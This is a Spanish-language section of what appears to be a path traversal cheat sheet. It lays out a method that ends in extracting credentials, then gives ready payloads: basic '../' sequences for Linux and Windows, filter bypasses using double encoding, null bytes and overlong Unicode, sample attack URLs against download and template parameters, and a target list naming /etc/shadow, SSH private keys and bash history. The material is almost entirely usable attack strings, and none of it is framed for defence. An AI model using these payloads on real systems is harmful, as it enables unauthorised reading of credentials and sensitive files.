
### Metodología

1. **Identificar punto de entrada**: Parámetros que manejan archivos o rutas
2. **Probar traversal básico**: `../../../etc/passwd`
3. **Identificar filtros**: Ver qué caracteres o patrones están bloqueados
4. **Bypassear restricciones**: Encoding, caracteres especiales, mezclar técnicas
5. **Extraer información**: Leer archivos de configuración, logs, credenciales


### Traversal básico

```ruby
# Para sistemas Linux
../../../../etc/passwd

# Para sistemas Windows
..\..\..\..\windows\win.ini
```


### Bypass de filtros

```ruby
# Con encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd

# Con doble slash
....//....//....//etc/passwd

# Con backslash (Windows)
..\..\..\..\windows\system32\config\sam

# Mezclando slash
..\/..\/..\/etc/passwd

# Null byte
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Caracteres Unicode
..%c0%af..%c0%af..%c0%afetc/passwd
```


### Traversal en parámetros específicos

```ruby
# En descarga de archivos
http://ejemplo.com/download?file=../../../../etc/passwd

# En visualización de imágenes
http://ejemplo.com/image?img=../../../../etc/passwd

# En inclusión de templates
http://ejemplo.com/template?t=../../../../etc/passwd
```


### Validación de archivos objetivo

```bash
# Información del sistema
/etc/issue
/etc/os-release
/proc/version

# Usuarios y credenciales
/etc/passwd
/etc/shadow (requiere privilegios)
/root/.bash_history
/home/user/.ssh/id_rsa

# Configuraciones de aplicaciones
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/var/www/html/config.php
```
